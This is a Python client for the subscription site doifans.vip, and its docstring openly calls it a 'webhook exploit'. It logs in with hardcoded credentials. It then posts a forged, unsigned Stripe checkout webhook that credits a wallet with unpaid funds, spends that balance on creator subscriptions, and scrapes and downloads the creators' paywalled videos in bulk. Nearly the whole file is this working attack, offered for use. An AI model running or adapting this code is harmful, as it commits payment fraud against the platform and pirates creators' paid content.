"""DoiFans API client — webhook exploit, subscription, video scraping."""

import re
import time
import urllib.parse
from pathlib import Path

import requests
import urllib3

urllib3.disable_warnings()

BASE_URL = "https://doifans.vip"
DEFAULT_USER = "cncmeng"
DEFAULT_PASS = "123123"
DEFAULT_UID = "36225"


class DoiFans:
    def __init__(self, base_url=BASE_URL, proxy=None):
        self.base = base_url.rstrip("/")
        self.s = requests.Session()
        self.s.verify = False
        self.s.headers.update({
            "Accept": "application/json",
            "X-Requested-With": "XMLHttpRequest",
        })
        if proxy:
            self.s.proxies = {"https": proxy, "http": proxy}

    def _xsrf(self):
        tok = self.s.cookies.get("XSRF-TOKEN")
        return urllib.parse.unquote(tok) if tok else ""

    def login(self, username=DEFAULT_USER, password=DEFAULT_PASS):
        self.s.get(f"{self.base}/password/reset", headers={"Accept": "text/html"})
        r = self.s.post(
            f"{self.base}/login",
            headers={"Content-Type": "application/json", "X-XSRF-TOKEN": self._xsrf()},
            json={"username_email": username, "password": password},
        )
        return r.json().get("success", False)

    def fund_wallet(self, amount=990, user_id=DEFAULT_UID):
        txn = str(int(time.time() * 1000))
        payload = {
            "type": "checkout.session.completed",
            "data": {"object": {
                "payment_status": "paid",
                "amount_total": amount * 100,
                "payment_intent": f"pi_{txn}",
                "metadata": {
                    "user": user_id, "amount": str(amount),
                    "taxes": "0", "type": "deposit", "transaction": txn,
                },
            }},
        }
        r = requests.post(
            f"{self.base}/stripe/webhook", json=payload,
            proxies=self.s.proxies, verify=False,
        )
        return "Webhook Handled" in r.text and "error" not in r.text.lower()

    def subscribe(self, creator_id):
        r = self.s.post(
            f"{self.base}/buy/subscription",
            headers={"Content-Type": "application/json", "X-XSRF-TOKEN": self._xsrf()},
            json={"id": str(creator_id), "interval": "monthly",
                  "payment_gateway": "wallet", "agree_terms": "1"},
        )
        data = r.json()
        if data.get("success"):
            return True
        msg = str(data.get("errors", ""))
        return "already" in msg.lower() or "活跃" in msg

    def resolve_creator(self, username):
        r = self.s.get(f"{self.base}/{username}", headers={"Accept": "text/html"})
        if r.status_code != 200 or "Redirecting" in r.text[:300]:
            return None, 0
        m = re.search(r'data-userid="(\d+)"', r.text)
        cid = m.group(1) if m else None
        if not cid:
            m = re.search(r'\bid\s*=\s*(\d{4,})', r.text)
            cid = m.group(1) if m else None
        m = re.search(r'totalPosts\s*=\s*(\d+)', r.text)
        total = int(m.group(1)) if m else 0
        return cid, total

    def scrape_videos(self, username):
        pat = r'(?:src|data-src|source\s+src)="(https?://[^"]*?/public/uploads(?:_new)?/updates/videos/[^"]+\.mp4)"'
        r = self.s.get(f"{self.base}/{username}", headers={"Accept": "text/html"})
        videos = re.findall(pat, r.text)
        cid, total = self.resolve_creator(username)
        if total > 5 and cid:
            for page in range(2, (total // 5) + 3):
                skip = (page - 1) * 5
                if skip >= total:
                    break
                ar = self.s.get(
                    f"{self.base}/ajax/updates",
                    params={"id": cid, "page": page, "skip": skip},
                    headers={"X-Requested-With": "XMLHttpRequest", "Accept": "text/html"},
                )
                if ar.status_code != 200 or len(ar.text.strip()) < 50:
                    break
                videos.extend(re.findall(pat, ar.text))
        return sorted(set(videos))

    def download(self, urls, dest):
        dest = Path(dest)
        dest.mkdir(parents=True, exist_ok=True)
        results = []
        for url in urls:
            name = url.split("/")[-1]
            path = dest / name
            if path.exists() and path.stat().st_size > 1000:
                results.append({"file": str(path), "status": "skipped", "size": path.stat().st_size})
                continue
            r = requests.get(url, proxies=self.s.proxies, verify=False, stream=True)
            if r.status_code == 200:
                with open(path, "wb") as f:
                    for chunk in r.iter_content(1024 * 1024):
                        f.write(chunk)
                results.append({"file": str(path), "status": "ok", "size": path.stat().st_size})
            else:
                results.append({"file": str(path), "status": "failed", "http": r.status_code})
        return results
